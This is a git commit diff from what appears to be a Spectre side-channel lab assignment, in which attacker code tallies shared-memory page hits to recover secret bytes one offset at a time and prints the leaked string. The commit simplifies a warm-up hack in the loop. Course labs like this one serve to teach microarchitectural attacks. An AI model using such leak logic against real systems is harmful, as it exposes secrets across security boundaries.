88b7b55300b7aeb860e7d8781e80986a3953345a
taratt <taratt.saba@gmail.com>
2024-10-22 03:59:56 -0400

    part 2

--- part2-src/attacker-part2.c
+++ part2-src/attacker-part2.c
@@ -41,7 +41,7 @@ int run_attacker(char *shared_memory) {
     int num_iterations = 1000;
 
     printf("Launching attacker\n");
-    bool main = 0;
+
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
         int page_stats[SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES] = {0};
@@ -67,32 +67,25 @@ int run_attacker(char *shared_memory) {
                     break;
                 }
             }
-            if (current_offset==2 && main==0){
-                current_offset =0;
-                main = 1;
-            }
-            if (main)
-                page_stats[page]++;
+            page_stats[page]++;
 
         }
        // printf("==================== \n");
-       if (main) {
-           int max = 0;
-           int final_p = 0;
-           for (int p = 0; p < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; p++) {
-               // printf("access time %d \n", page_stats[p]);
-               if (page_stats[p] > max) {
-                   max = page_stats[p];
-                   leaked_byte = (char) p;
-               }
-           }
-           //leaked_byte = (char)page;
+        int max = 0;
+        int final_p = 0;
+        for (int p = 0; p < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; p++) {
+           // printf("access time %d \n", page_stats[p]);
+            if (page_stats[p] > max) {
+                max = page_stats[p];
+                leaked_byte = (char)p;
+            }
+        }
+        //leaked_byte = (char)page;
 
-           leaked_str[current_offset] = leaked_byte;
-           if (leaked_byte == '\x00') {
-               break;
-           }
-       }
+        leaked_str[current_offset] = leaked_byte;
+        if (leaked_byte == '\x00') {
+            break;
+        }
     }
 
     printf("\n\n[Part 2] We leaked:\n%s\n", leaked_str);
